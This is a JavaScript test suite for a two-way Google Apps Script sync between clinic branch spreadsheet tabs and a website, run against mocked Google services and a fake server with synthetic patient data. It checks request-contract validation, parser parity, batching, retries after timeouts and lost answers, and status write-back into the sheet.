// Tests of the Google Apps Script apps-script/AajSync.js (the two-way Aaj ki List sync): node tests/aaj-sync-script.test.mjs
//
// The script is loaded into a fake Google (tests/apps-script-mock.mjs: sheets with the real tabs' header variants, hidden helper
// columns, properties, locks, triggers, a clock, the archive spreadsheet) and talks to a fake website
// (tests/aaj-sync-fake-server.mjs, written from the contract in .omc/handoffs/aaj-sync-design.md section 2). The real SQL is tested
// in supabase/tests/25_aaj_sync_test.sql. Everything here is synthetic: no real names, phones or Mr numbers.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { createEnv, stripComments, SCRIPT_PATH } from './apps-script-mock.mjs';
import { createServer } from './aaj-sync-fake-server.mjs';
import * as web from '../web/js/lib/aaj.js';
import { cleanLegacyName, splitPeople } from '../web/js/lib/legacy.js';
import { parseMonthCell } from '../web/js/lib/protocol.js';
import { parseCSV, phoneOf } from '../web/js/lib/healthwire.js';

let passed = 0, failed = 0;
const test = (name, fn) => {
  if (process.env.AAJ_TEST_ONLY && !name.includes(process.env.AAJ_TEST_ONLY)) return;   // AAJ_TEST_ONLY="5 tabs x 100" runs one test
  const t0 = Date.now();
  try { fn(); passed++; console.log('ok -', name + (process.env.AAJ_TEST_TIMES ? `  [${Date.now() - t0} ms]` : '')); }
  catch (e) { failed++; console.log('FAIL -', name, '\n   ', String(e.stack || e.message).split('\n').slice(0, 6).join('\n    ')); process.exitCode = 1; }
};

const fixture = JSON.parse(fs.readFileSync(new URL('./fixtures/aaj-sync-tab.json', import.meta.url), 'utf8'));
const TABS = ['Gulshan KHI', 'North Nazimabad', 'DHA KHI', 'Gulberg Lhr', 'Islamabad'];
const BRANCH = { 'Gulshan KHI': 'GUL', 'North Nazimabad': 'NN', 'DHA KHI': 'DHA', 'Gulberg Lhr': 'LHR', 'Islamabad': 'ISB' };
const TODAY = '2026-10-09';
const SECRET = 'sync-secret';

// ------------------------------------------------------------------------------------------------ helpers
const clone = (x) => JSON.parse(JSON.stringify(x));
const norm = (s) => String(s ?? '').toLowerCase().replace(/\s+/g, ' ').trim();

/** column number (1-based) of a header, found by the first words of its text ("token" finds "Token No ", "Token #", "Token") */
function colOf(env, tab, label) {
  const sh = env.tab(tab);
  const used = sh.used().cols;
  for (let c = 1; c <= used; c++) if (norm(sh.text(1, c)).startsWith(label.toLowerCase())) return c;
  throw new Error(`no column "${label}" in ${tab}: ${sh.row(1).join(' | ')}`);
}
const cellOf = (env, tab, r, label) => env.tab(tab).text(r, colOf(env, tab, label));
const setCell = (env, tab, r, label, value, opts) => env.type(tab, r, colOf(env, tab, label), value, opts);
/** the row number of the first patient row whose Patient Name starts with `name` */
function rowOf(env, tab, name) {
  const sh = env.tab(tab);
  const nc = (() => { for (let c = 1; c <= sh.used().cols; c++) if (/^patient/i.test(sh.text(1, c).trim())) return c; return 2; })();
  for (let r = 2; r <= sh.used().rows; r++) if (norm(sh.text(r, nc)).startsWith(name.toLowerCase())) return r;
  return null;
}
const fx = (tab, i) => fixture.rows[tab][i].slice();
/** the row whose patient name is exactly this */
function exactRow(env, tab, name) {
  const sh = env.tab(tab);
  const nc = colOf(env, tab, 'patient');
  for (let r = 2; r <= sh.used().rows; r++) if (sh.text(r, nc) === name) return r;
  return null;
}
const statusOf = (env, tab, r) => cellOf(env, tab, r, 'website');
const headerOf = (env, tab) => env.tab(tab).text(1, colOf(env, tab, 'website'));
const visitsOfPatient = (server, name) => server.state.visits.filter((v) => server.patientByMr(v.mr).name === name);

/**
 * Every request the script ever sends is checked against the contract (design section 2.1), in every test below.
 * A request that breaks it throws inside the fake fetch, so the test that caused it fails.
 */
const KEY_RE = /^(S-[0-9a-f]{12}|W-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})$/;
const SHARED = ['mr', 'name', 'phone', 'month', 'treatment', 'token', 'status', 'group', 'doctors', 'details'];
function validateRequest(req) {
  const fail = (m) => { throw new Error('CONTRACT: ' + m); };
  if (req.method !== 'post') fail('method ' + req.method);
  if (!/\/rest\/v1\/rpc\/aaj_sync$/.test(req.url)) fail('url ' + req.url);
  if (!req.headers.apikey || req.headers.Authorization !== 'Bearer ' + req.headers.apikey) fail('headers');
  const body = JSON.parse(req.body);
  if (JSON.stringify(Object.keys(body).sort()) !== '["p_payload","p_secret"]') fail('body keys');
  const p = body.p_payload;
  if (JSON.stringify(Object.keys(p).sort()) !== '["check_removed","date","tabs"]') fail('payload keys ' + Object.keys(p));
  if (!/^\d{4}-\d{2}-\d{2}$/.test(p.date) || typeof p.check_removed !== 'boolean' || !Array.isArray(p.tabs) || p.tabs.length > 5) fail('payload shape');
  let rows = 0;
  const seen = new Set();
  for (const t of p.tabs) {
    // a quiet minute asks only "anything new?": no rows and no list of present rows (so the website claims and removes nothing)
    const quick = !('present' in t);
    if (JSON.stringify(Object.keys(t).sort()) !== (quick ? '["branch","hash","rows","tab"]' : '["branch","hash","present","rows","tab"]')) fail('tab keys ' + Object.keys(t));
    if (quick && (t.rows.length || p.check_removed || t.hash === null)) fail('a call without "present" carries no rows, no removal pass and a hash');
    if (BRANCH[t.tab] !== t.branch || seen.has(t.branch)) fail('tab ' + t.tab);
    seen.add(t.branch);
    if (!(t.hash === null || /^[0-9a-f]{32}$/.test(t.hash))) fail('hash ' + t.hash);
    if (!quick && (!Array.isArray(t.present) || t.present.length > 400 || t.present.some((k) => !KEY_RE.test(k)) || new Set(t.present).size !== t.present.length)) fail('present');
    rows += t.rows.length;
    for (const r of t.rows) {
      if (Object.keys(r).some((k) => !['key', 'new', 'edited_at', 'set', 'base'].includes(k))) fail('row keys ' + Object.keys(r));
      if (!KEY_RE.test(r.key) || typeof r.new !== 'boolean' || !(r.edited_at === null || Number.isFinite(r.edited_at))) fail('row ' + JSON.stringify(r).slice(0, 120));
      if (!t.present.includes(r.key)) fail('a row whose key is not in present');
      if (r.new === (r.base !== undefined)) fail('base must be given for linked rows only');
      const set = r.set;
      const strings = ['mr', 'name', 'legacy_name', 'phone', 'treatment', 'details', 'pp', 'healthwire', 'reminder'];
      for (const f of Object.keys(set)) {
        if (![...SHARED, 'legacy_name', 'pp', 'healthwire', 'reminder'].includes(f)) fail('set field ' + f);
        if (strings.includes(f)) { if (typeof set[f] !== 'string') fail(f + ' must be a string'); }
        else if (f === 'doctors') { if (typeof set.doctors.t !== 'string' || !Array.isArray(set.doctors.v) || set.doctors.v.some((x) => typeof x !== 'string') || set.doctors.v.length > 10) fail('doctors'); }
        else {
          if (typeof set[f].t !== 'string' || !('v' in set[f])) fail(f + ' must be {t, v}');
          if (f === 'status' ? !(set.status.v === null || typeof set.status.v === 'string') : !(set[f].v === null || Number.isInteger(set[f].v))) fail(f + '.v');
        }
      }
      if (set.status && set.status.t === '') fail('an empty Status cell is never sent');
      if (r.new && set.mr === undefined) fail('a new row always carries mr');
      if ('name' in set && !('legacy_name' in set)) fail('name goes with legacy_name');
      if (r.new && !set.name) fail('a new row needs a name');
      if (r.base) {
        for (const f of Object.keys(r.base)) if (!(f in set) || !SHARED.includes(f)) fail('base for ' + f);
        for (const f of Object.keys(set)) if (SHARED.includes(f) && !(f in r.base)) fail('missing base for ' + f);
        if (r.base.doctors && !Array.isArray(r.base.doctors)) fail('base doctors');
      }
    }
  }
  if (rows > 25) fail('more than 25 rows in a call');
}

/**
 * A clinic day: the fake Google with the given tabs (header + rows from the fixture, or `rows`), the fake website, the one-minute
 * trigger state set as aajSetup leaves it. `patients` are added to the website first.
 */
const CK_ID = '1wdRT8RqHLF-x2X6AVqLnvGkYrFWZEB3BGbx1CowMe_Y';
function world({ tabs = ['Gulshan KHI'], rows = {}, patients = [], install = true, helpers = true, date = TODAY, at = '08:00', fixtureRows = true, checkupBook = true } = {}) {
  const env = createEnv();
  if (checkupBook) env.checkupBook = env.addBook(CK_ID, 'Checkup karwaliya');
  const server = createServer({ now: () => env.clock.ms });
  env.fetchHandler = (req) => { validateRequest(req); return server.handler(req); };
  env.at(date, at);
  for (const p of patients) server.addPatient(p);
  for (const t of tabs) env.addTab(t, [fixture.headers[t], ...(rows[t] || (fixtureRows ? fixture.rows[t] : []))]);
  if (install) {
    for (const t of tabs) env.props.document.set('listDate:' + t, date);
    env.props.user.set('AAJ_SYNC_SECRET', SECRET);
    if (helpers) for (const t of tabs) { const sh = env.tab(t); env.ctx.aajEnsureHelpers_(sh, sh.getRange(1, 1, 1, sh.getLastColumn()).getDisplayValues()[0]); }   // the helper columns Set up creates
    for (const h of ['aajSyncTick', 'aajOnEdit', 'aajOnChange', 'aajOnOpen']) env.triggers.push({ handler: h, id: 'seed-' + h, source: h === 'aajSyncTick' ? 'CLOCK' : 'SPREADSHEETS', event: h === 'aajSyncTick' ? 'CLOCK' : h === 'aajOnChange' ? 'ON_CHANGE' : 'ON_EDIT' });
  }
  return { env, server };
}
/** run a few ticks, letting 61 s pass first so rows typed a moment ago have settled */
function settle(env, n = 2) { env.advance(61000); return env.ticks(n); }

const BASE_PATIENTS = [
  { mr: '9701', name: 'Sample Person One', phone: '03001110001' },
  { mr: '146', name: 'Sample Person Two', phone: '03001110002' },
  { mr: '9703', name: 'Sample Person Six', phone: '03001110006' },
];

// ------------------------------------------------------------------------------------------------ the file itself
test('the script is plain: no import/export/require, no ?. or ??, only function/var at the top, names start with aaj/AAJ', () => {
  const src = fs.readFileSync(SCRIPT_PATH, 'utf8');
  const code = stripComments(src);
  assert.ok(!/\bimport\s*[\w{*]|\bexport\s+(default|const|function|var|let|class|\{)|\brequire\s*\(/.test(code), 'module syntax');
  assert.ok(!/\?\./.test(code.replace(/'(?:[^'\\]|\\.)*'/g, "''").replace(/\/(?:[^\/\\\n]|\\.)+\/[gimsuy]*/g, '/re/')), 'optional chaining');
  assert.ok(!/\?\?/.test(code.replace(/'(?:[^'\\]|\\.)*'/g, "''")), 'nullish operator');
  assert.ok(!/^\s*(const|let|class)\s/m.test(code.split('\n').filter((l) => !/^\s/.test(l)).join('\n')), 'top-level const/let/class');
  const tops = [...code.matchAll(/^(?:function\s+([A-Za-z_$][\w$]*)|var\s+([A-Za-z_$][\w$]*))/gm)].map((m) => m[1] || m[2]);
  assert.ok(tops.length > 40);
  for (const n of tops) assert.match(n, /^(aaj|AAJ)/, `top-level name ${n}`);
  assert.equal((src.match(/Utilities\.formatDate\(/g) || []).length, 1, 'one formatDate, in aajFmt_');
  assert.ok(/Utilities\.formatDate\(new Date\(ms\), AAJ\.TZ, fmt\)/.test(src), 'the time zone is always given explicitly');
  assert.ok(!/getScriptTimeZone|getTimeZone|\.getHours\(|\.getDate\(|\.getDay\(/.test(code), 'no default-time-zone date parts');
  assert.ok(src.includes("KEY: 'sb_publishable_"), 'carries the publishable key only');
  assert.ok(!/service_role|eyJhbGci/.test(src));
});

test('the script only knows the five branch tabs by their exact names', () => {
  const env = createEnv();
  const cfg = env.global('AAJ');
  assert.deepEqual(cfg.TABS.map((t) => t.tab), TABS);
  assert.deepEqual(cfg.TABS.map((t) => t.branch), ['GUL', 'NN', 'DHA', 'LHR', 'ISB']);
  assert.equal(cfg.TZ, 'Asia/Karachi');
});

// ------------------------------------------------------------------------------------------------ parity with web/js/lib/aaj.js
const AAJ_TEST_TAB = [  // the rows of tests/aaj.test.mjs
  ['Tt Mr #', 'Tt Patient Name', 'Monthly', 'Tt Treatment', 'Token No', 'Waiting', 'Group', "Doctor's Name", 'Tt Treatment Details', 'P.P', 'Healthwire', 'Tt Contact No', 'Reminder Status'],
  ['9694', 'Sample Person Two', '2', 'Monthly', 121, 'Completed', '', 'Dr. Ali Rashid', '', '', 'Done', '03001112233', ''],
  ['8715', 'Sample Person Three lhr', '6 Photo', 'Monthly', 119, 'Completed', 'Group 3', 'Dr Haniya, Dr. Samrah Khan', 'Brac 16 13 45 46 U L 016', '35k', 'Done', 3004445566, ''],
  ['', 'Sample Person Seven', '', 'Checkup', 79, 'Not came', '', 'Dr. Unknown Person', '', '', '', '03211234567', 'Called'],
  ['9694', 'Sample Person Two', '3', 'Monthly', 1, 'Completed', '', 'Dr. Ali Rashid, Hira Anis', 'U L 014', '', '', '03001112233', ''],
  ['', 'Sample Person Nine', '', 'Filling', 2, '', '', '', '', '', '', '', ''],
];
const webDetect = (h) => web.detectColumns(h);

function paritySources() {
  const csv = parseCSV(fs.readFileSync(new URL('./fixtures/aaj-ki-list-sample.csv', import.meta.url), 'utf8'));
  const src = [{ name: 'aaj-ki-list-sample.csv', header: csv[0], rows: csv.slice(1).filter((r) => r.some((c) => String(c).trim())) },
    { name: 'tests/aaj.test.mjs TAB', header: AAJ_TEST_TAB[0], rows: AAJ_TEST_TAB.slice(1) }];
  for (const t of TABS) src.push({ name: 'aaj-sync-tab.json ' + t, header: fixture.headers[t], rows: fixture.rows[t] });
  return src;
}

test('parity: detectColumns reads every header exactly as web/js/lib/aaj.js does ("Months" included)', () => {
  const env = createEnv();
  for (const s of paritySources()) {
    assert.deepEqual(env.call('aajDetectColumns', s.header), webDetect(s.header), s.name);
    assert.equal(env.call('aajIsHeaderRow', s.header), web.isHeaderRow(s.header), s.name);
  }
  // the real tabs' header variants (snapshot 2026-10-09): Months, Monthly, Month; Token / Token No / Token #; Waiting / Status; Column 13 as the group
  const m = (t) => env.call('aajDetectColumns', fixture.headers[t]);
  assert.equal(m('Gulshan KHI').month, 2, '"Months" is the month column');
  assert.equal(m('North Nazimabad').month, 2, '"Monthly " with a trailing space');
  assert.deepEqual([m('North Nazimabad').group, m('North Nazimabad').doctors, m('North Nazimabad').phone, m('North Nazimabad').reminder], [6, 7, 11, 12], 'NN: the extra Column 13/14/16 do not take over any field');
  assert.equal(m('DHA KHI').group, 6, 'DHA: "Column 13" is the group');
  assert.equal(m('DHA KHI').token, 4, '"Token No " with a trailing space');
  assert.deepEqual([m('Gulberg Lhr').token, m('Gulberg Lhr').status, m('Gulberg Lhr').pp, m('Gulberg Lhr').reminder], [4, 5, 9, 12], 'Lahore: Token #, Status, P P, Reminder');
  assert.deepEqual(m('Islamabad'), m('Gulberg Lhr'));
  for (const t of TABS) assert.ok(env.call('aajIsHeaderRow', fixture.headers[t]), t);
});

test('parity: aajReadRow reads every fixture row exactly as web/js/lib/aaj.js readRow (any difference fails)', () => {
  const env = createEnv();
  assert.equal(typeof web.readRow, 'function', 'web/js/lib/aaj.js exports readRow');
  let compared = 0;
  for (const s of paritySources()) {
    const cols = webDetect(s.header);
    for (const row of s.rows) {
      const padded = row.slice();
      while (padded.length < s.header.length) padded.push('');
      const mine = env.call('aajReadRow', padded, env.call('aajDetectColumns', s.header));
      assert.deepEqual(mine, clone(web.readRow(padded, cols)), `${s.name}: ${row[1]}`);
      compared++;
    }
  }
  assert.ok(compared >= 25, 'rows compared: ' + compared);
});

test('parity: the Admin -> Import reader (readTab) reads a tab with the strict readers: "Months" is a month column, "Kit 80k" is not a token, two phones are not glued, a Mr# is an Mr#', () => {
  const header = fixture.headers['Gulshan KHI'];
  const t = web.readTab([header, ...fixture.rows['Gulshan KHI']]);
  assert.equal(t.columns.month, 2);
  const byName = (n) => t.rows.find((r) => r.name === n);
  assert.equal(byName('Sample Person One').month, 5);
  assert.equal(byName('Sample Person Five').token, null, 'Kit 80k is not token 80');
  assert.equal(byName('Sample Person Six').token, null, '1 pfm is not token 1');
  assert.equal(byName('Sample Person Three').phone, '03001110003', 'the first of two numbers');
  assert.equal(byName('Sample Person Two').group, '1');
  assert.equal(byName('Sample Person Four').group, null, 'Group 4 has no website group');
  const z = web.readTab([fixture.headers['Gulberg Lhr'], ...fixture.rows['Gulberg Lhr']]);
  assert.deepEqual(z.rows.map((r) => r.token), [null, null, null], 'kit text and 4 Zirconia in the Token column of Lahore');
});

const LOOSE = {
  firstPhone: ['03001234567', '3001234567', '92 300 1234567', '0300 1111111 / 0321 2222222', '03001111111, 03212222222', '03001111111 or 03212222222', '', null, 'call mother', '12345', '0300-1234567', 3001234567, '0300 1234567'],
  tokenOf: ['1', ' 12 ', '121', '1.0', '80k', 'Kit 80k', '1 pfm', '4 Zirconia', 'Dr Verda', '', '0', '999', '1000', '12.5', null],
  groupOf: ['Group 1', 'Group 3', 'Group 4', 'Group', 'Group 1, Group 2', 'Group 2, Group 1', '2', '12', '21', '', 'G3'],
  liveStatus: ['Waiting', 'waiting ', 'Treatment', 'In treatment', 'Scheduled', 'Completed', 'completed', 'Cancelled', 'No show', 'No-show', 'Not came', 'Done', 'Arrived', 'Appointment', '', '   ', 'Banana', null, 'Pending'],
  mrOf: ['9851', '146.0', ' 9851 ', 'NEW', 'new', '98 51', 'abc', 'A-12', '', 'x9', null, '8602.', ' 8602. ', '8602..', '.', '146.0.'],
  givenName: ['M Umer', 'Muhammad Umer', 'Sana Ahmed', 'Dr. Sara', 'baby of Sana', 'Syed', 'Mr', '', null, 'Muhammad', 'Ayesha Khan', "O'Neil Smith"],
  cleanLegacyName: ['Sana lhr', 'AHMED KHAN N.N', 'Zara Isb.', 'Plain Name', 'x', 'dha', 'Ali Raza (Kid)', '  spaced   out  '],
  splitPeople: ['Dr. Ali Rashid, Assistant A, Dr. B', 'Dr A / Dr B & Dr C', 'Dr A and Dr B', '', 'Hira Anis, Dr Haniya', 'Dr. Komal Rubab,Dr Haniya'],
  parseMonthCell: ['4', '04 Photo', '13 Photo', 'Monthly', '', null, '5.0', '21 Photo', '60', '61'],
  phoneOf: ['03001234567', 3001234567, '92 300 1234567', '123', '', null, '3.0012345E+9'],
};
const WEB_FN = { cleanLegacyName, splitPeople, parseMonthCell, phoneOf };
const SCRIPT_FN = { firstPhone: 'aajFirstPhone', tokenOf: 'aajTokenOf', groupOf: 'aajGroupOf', liveStatus: 'aajLiveStatus', mrOf: 'aajMrOf', givenName: 'aajGivenName', cleanLegacyName: 'aajCleanLegacyName', splitPeople: 'aajSplitPeople', parseMonthCell: 'aajParseMonthCell', phoneOf: 'aajPhoneOf' };

test('parity: the parsers give the same answer in the script and in web/js/lib (loose strings table)', () => {
  const env = createEnv();
  for (const [fn, inputs] of Object.entries(LOOSE)) {
    const theirs = WEB_FN[fn] || web[fn];
    assert.equal(typeof theirs, 'function', `web/js/lib exports ${fn}`);
    for (const input of inputs) {
      if ((fn === 'cleanLegacyName' || fn === 'splitPeople') && input === null) continue;
      assert.deepEqual(env.call(SCRIPT_FN[fn], input), clone(theirs(input)), `${fn}(${JSON.stringify(input)})`);
    }
  }
});

test('the parsers follow the design table (9.1) whatever the web copy does', () => {
  const env = createEnv();
  const is = (fn, input, expected) => assert.deepEqual(env.call(SCRIPT_FN[fn], input), expected, `${fn}(${JSON.stringify(input)})`);
  is('firstPhone', '3001234567', '03001234567');
  is('firstPhone', '0300 1111111 / 0321 2222222', '03001111111');
  is('firstPhone', '03001111111, 03212222222', '03001111111');
  is('firstPhone', '03001111111 or 03212222222', '03001111111');
  is('firstPhone', '', null);
  is('tokenOf', '121', 121); is('tokenOf', '1.0', 1); is('tokenOf', 'Kit 80k', null); is('tokenOf', '1 pfm', null);
  is('tokenOf', '4 Zirconia', null); is('tokenOf', 'Dr Verda', null); is('tokenOf', '0', null); is('tokenOf', '1000', null);
  is('groupOf', 'Group 1', '1'); is('groupOf', 'Group 3', '3'); is('groupOf', 'Group 4', null); is('groupOf', 'Group', null);
  is('groupOf', 'Group 1, Group 2', '1'); is('groupOf', 'Group 2, Group 1', '2'); is('groupOf', '12', null);
  const live = { Waiting: 'waiting', Treatment: 'in_treatment', 'In treatment': 'in_treatment', Scheduled: 'scheduled', Completed: 'completed', Cancelled: 'cancelled',
    'No show': 'no_show', 'Not came': 'no_show', Done: 'completed', '': null, Banana: null, Arrived: 'waiting' };
  for (const [k, v] of Object.entries(live)) is('liveStatus', k, v);
  is('mrOf', '146.0', { mr: '146', isNew: false }); is('mrOf', 'NEW', { mr: null, isNew: true }); is('mrOf', '98 51', { mr: null, isNew: false });
  is('mrOf', 'abc', { mr: null, isNew: false }); is('mrOf', '', { mr: null, isNew: false });
  is('givenName', 'M Umer', 'umer'); is('givenName', 'Muhammad Umer', 'umer'); is('givenName', 'Syed', 'syed'); is('givenName', '', '');
});

test('the history reading of a status cell is kept for the Admin import only: a live row never reads Waiting or Scheduled as Completed', () => {
  const env = createEnv();
  for (const w of ['Waiting', 'Treatment', 'Scheduled', 'In treatment', '']) {
    assert.equal(env.call('aajHistoryStatus', w), 'completed', 'history import: unchanged');
    assert.notEqual(env.call('aajLiveStatus', w), 'completed', 'live: ' + w);
  }
});

// ------------------------------------------------------------------------------------------------ first sync
const rowsSent = (server) => server.calls.flatMap((c) => (c.payload.tabs || []).flatMap((t) => (t.rows || []).map((r) => ({ ...r, tab: t.tab, call: c }))));
const keyCol = (env, tab) => colOf(env, tab, 'sync key');
const keysOf = (env, tab) => { const sh = env.tab(tab); const c = keyCol(env, tab); const out = []; for (let r = 2; r <= sh.used().rows; r++) if (sh.text(r, c)) out.push(sh.text(r, c)); return out; };

test('first sync of a tab full of existing rows: keys are written into the sheet BEFORE the first send, every row is sent once, nothing doubles', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  const seen = [];
  env.fetchHandler = (req) => { seen.push({ keys: keysOf(env, 'Gulshan KHI'), body: JSON.parse(req.body) }); return server.handler(req); };
  env.ticks(1);                                             // first sight: rows get their key and a stamp, nothing is sent yet
  assert.equal(rowsSent(server).length, 0, 'a row without an edit stamp waits one tick');
  assert.equal(keysOf(env, 'Gulshan KHI').length, 6);
  env.ticks(1);
  const sent = rowsSent(server);
  assert.equal(sent.length, 6, 'each of the six rows sent once');
  assert.equal(new Set(sent.map((r) => r.key)).size, 6);
  const atCall = seen[seen.length - 1];
  for (const r of atCall.body.p_payload.tabs[0].rows) assert.ok(atCall.keys.includes(r.key), 'the key was already in the sheet when the row was sent');
  assert.ok(sent.every((r) => r.new === true && /^S-[0-9a-f]{12}$/.test(r.key)));
  assert.equal(server.state.visits.length, 3, 'the three rows with an Mr# became visits');
  assert.equal(server.state.checkups.length, 3, 'the three rows with no Mr# became checkups');
  assert.equal(server.state.patients.length, 3, 'no patient file (and no Mr#) was made for a checkup');
  for (const v of [...server.state.visits, ...server.state.checkups]) assert.ok(keysOf(env, 'Gulshan KHI').includes(v.sheet_key));
  env.ticks(3);
  assert.equal(rowsSent(server).length, 6, 'idle ticks send nothing more');
  assert.equal(server.state.visits.length, 3);
  assert.equal(server.state.checkups.length, 3);
  // "Kit 80k" is the checkup's token text; "1 pfm" never became a website token on a visit
  const kit = server.state.checkups.find((c) => c.name === 'Sample Person Five');
  assert.equal(kit.token, 'Kit 80k', 'Kit 80k is kept as text');
  assert.equal(server.state.visits.find((v) => server.patientByMr(v.mr).name === 'Sample Person Six').cells.token.v, null, '1 pfm is not a token');
  assert.equal(cellOf(env, 'Gulshan KHI', rowOf(env, 'Gulshan KHI', 'Sample Person Five'), 'token'), 'Kit 80k', 'the kit text stays in the sheet');
  assert.equal(cellOf(env, 'Gulshan KHI', rowOf(env, 'Gulshan KHI', 'Sample Person Six'), 'token'), '1 pfm');
});

test('first sync writes back what the website knows: a checkup has no Mr# (the cell stays empty), the numbered token; statuses say what happened', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  settle(env);
  const r3 = rowOf(env, 'Gulshan KHI', 'Sample Person Three');
  assert.equal(cellOf(env, 'Gulshan KHI', r3, 'mr'), '', 'a checkup patient has no Mr#: the cell stays empty');
  assert.equal(cellOf(env, 'Gulshan KHI', r3, 'contact'), '03001110003 / 03211110003', 'a cell the person typed is not rewritten');
  assert.equal(statusOf(env, 'Gulshan KHI', r3), '\u2713 Checkup patient: no Mr#, no patient file.');
  const r5 = rowOf(env, 'Gulshan KHI', 'Sample Person Five');
  assert.equal(cellOf(env, 'Gulshan KHI', r5, 'mr'), '', '"NEW" in the Mr# cell is the same as empty: a checkup; the word is cleared');
  const r1 = rowOf(env, 'Gulshan KHI', 'Sample Person One');
  assert.equal(statusOf(env, 'Gulshan KHI', r1), '\u2713 On website');
  assert.equal(env.tab('Gulshan KHI').font(r1, colOf(env, 'Gulshan KHI', 'website')), null, 'ok: default colour');
  const r2 = rowOf(env, 'Gulshan KHI', 'Sample Person Two');
  assert.match(statusOf(env, 'Gulshan KHI', r2), /^\u26a0 Not on the website's doctor list/);
  assert.equal(env.tab('Gulshan KHI').font(r2, colOf(env, 'Gulshan KHI', 'website')), '#b45309', 'warning: amber');
  const r4 = rowOf(env, 'Gulshan KHI', 'sample person four');
  assert.match(statusOf(env, 'Gulshan KHI', r4), /^\u26a0 A checkup cannot be Scheduled\. Saved as Waiting\./);
  assert.equal(cellOf(env, 'Gulshan KHI', r4, 'waiting'), 'Waiting', 'a checkup cannot be Scheduled: the sheet is told what the website kept');
  assert.equal(cellOf(env, 'Gulshan KHI', r4, 'patient'), 'sample person four lhr', 'the typed name is never changed');
  assert.match(headerOf(env, 'Gulshan KHI'), /^Website \u00b7 \d\d:\d\d \u00b7 \d need attention$/);
  assert.equal(server.state.visits.length, 3);
  assert.equal(server.state.checkups.length, 3);
});

test('the same row is not sent again until it changes or five minutes pass (a row the website could not place)', () => {
  const rows = [['50123', 'Typo Person', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001119999', '']];     // 50123: a website-range number nobody has
  const { env, server } = world({ patients: [...BASE_PATIENTS, { mr: '9704', name: 'Typo Person', phone: '03001110004' }], rows: { 'Gulshan KHI': rows } });
  settle(env);
  const count = () => rowsSent(server).filter((r) => r.set.name === 'Typo Person').length;
  assert.equal(count(), 1);
  assert.equal(statusOf(env, 'Gulshan KHI', 2), '\u2717 Mr# 50123 is not on the website. Check the number.');
  env.ticks(3);
  assert.equal(count(), 1, 'quiet for three minutes');
  env.advance(5 * 60000);
  env.ticks(1);
  assert.equal(count(), 2, 'tried again after five minutes');
  setCell(env, 'Gulshan KHI', 2, 'mr', '9704');
  env.advance(61000);
  env.ticks(1);
  assert.equal(count(), 3, 'tried again at once when the person corrected the Mr#');
  assert.equal(server.state.visits.length, 1, 'now the Mr# is a patient and the row has a visit');
  assert.equal(statusOf(env, 'Gulshan KHI', 2), '\u2713 On website');
});

test('30 new rows go in two calls (25 + 5); present rides on every call, check_removed only on the last', () => {
  const rows = [];
  for (let i = 0; i < 30; i++) rows.push(['', `Walk In ${i + 1}`, '', 'Checkup', '', 'Waiting', '', '', '', '', '', `0301${String(1000000 + i).slice(1)}`, '']);
  const { env, server } = world({ rows: { 'Gulshan KHI': rows } });
  settle(env);
  const calls = server.calls.filter((c) => c.payload.tabs[0].rows.length);
  assert.deepEqual(calls.map((c) => c.payload.tabs[0].rows.length), [25, 5]);
  assert.deepEqual(calls.map((c) => c.payload.check_removed), [false, true]);
  for (const c of calls) { assert.equal(c.payload.tabs[0].present.length, 30); assert.equal(c.payload.date, TODAY); }
  assert.equal(server.state.checkups.length, 30, 'each walk-in without an Mr# became a checkup');
  assert.equal(server.state.visits.length, 0);
  assert.equal(server.state.patients.length, 0, 'no patient file was made for any of them');
  assert.equal(statusOf(env, 'Gulshan KHI', 31), '\u2713 Checkup patient: no Mr#, no patient file.');
});

test('a statement timeout (57014) halves the batch (never below 5) and the rows still arrive; the next day it is 25 again', () => {
  const rows = [];
  for (let i = 0; i < 30; i++) rows.push(['', `Walk In ${i + 1}`, '', 'Checkup', '', 'Waiting', '', '', '', '', '', `0301${String(1000000 + i).slice(1)}`, '']);
  const { env, server } = world({ rows: { 'Gulshan KHI': rows } });
  server.faults.timeoutOverRows = 10;
  settle(env);
  assert.equal(server.state.checkups.length, 30);
  assert.equal(env.props.document.get('batch'), '6', '25 -> 12 -> 6');
  const ok = server.calls.filter((c) => c.response.code === 200 && c.payload.tabs[0].rows.length);
  assert.ok(ok.every((c) => c.payload.tabs[0].rows.length <= 10));
  // the floor is 5
  const w2 = world({ rows: { 'Gulshan KHI': rows.slice(0, 12) } });
  w2.server.faults.timeoutOverRows = 1;
  settle(w2.env, 2);
  assert.equal(w2.env.props.document.get('batch'), '5');
  assert.equal(w2.server.state.checkups.length, 0);
  assert.match(headerOf(w2.env, 'Gulshan KHI'), /not syncing/);
  // next day: back to 25
  server.faults.timeoutOverRows = 0;
  env.at('2026-10-10', '08:00');
  env.props.document.set('listDate:Gulshan KHI', '2026-10-10');
  env.ticks(1);
  assert.equal(env.props.document.get('batch'), '25');
});

test('a lost answer (the website did the work but the script never heard): the retry creates no second visit', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  env.ticks(1);
  env.advance(61000);
  server.faults.lostAnswers = 1;
  env.ticks(1);
  assert.equal(server.state.visits.length + server.state.checkups.length, 6, 'the website did create the visits and checkups');
  assert.match(headerOf(env, 'Gulshan KHI'), /^Website \u00b7 \u2717 \d\d:\d\d not syncing: the website did not answer$/);
  assert.equal(statusOf(env, 'Gulshan KHI', 2), '', 'no row claims to be on the website yet');
  const keysBefore = keysOf(env, 'Gulshan KHI');
  env.ticks(2);
  assert.equal(server.state.visits.length + server.state.checkups.length, 6, 'still six: the same keys were sent again and found');
  assert.deepEqual(keysOf(env, 'Gulshan KHI'), keysBefore, 'the rows kept their keys');
  assert.equal(statusOf(env, 'Gulshan KHI', 2), '\u2713 On website');
  assert.equal(server.state.patients.length, 3, 'no patient was made');
});

test('the website answering badly (500) or down is shown in the header and costs nothing; sync resumes by itself', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  settle(env);
  server.faults.status500 = 2;                              // the quiet-minute question fails, and so does the full run that follows
  env.ticks(1);
  assert.match(headerOf(env, 'Gulshan KHI'), /not syncing: the website did not answer/);
  server.faults.down = 1;
  env.ticks(1);
  assert.match(headerOf(env, 'Gulshan KHI'), /not syncing/);
  env.ticks(1);
  assert.match(headerOf(env, 'Gulshan KHI'), /^Website \u00b7 \d\d:\d\d \u00b7 \d need attention$/);
  assert.equal(server.state.visits.length, 3);
});

